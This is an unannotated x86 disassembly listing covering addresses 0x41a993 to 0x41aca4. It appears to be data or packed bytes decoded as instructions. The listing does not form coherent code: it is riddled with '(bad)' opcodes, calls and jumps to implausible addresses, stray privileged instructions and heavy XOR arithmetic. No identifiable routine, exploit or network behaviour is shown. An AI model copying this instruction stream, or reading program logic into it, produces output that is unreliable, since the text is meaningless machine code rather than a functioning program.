  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
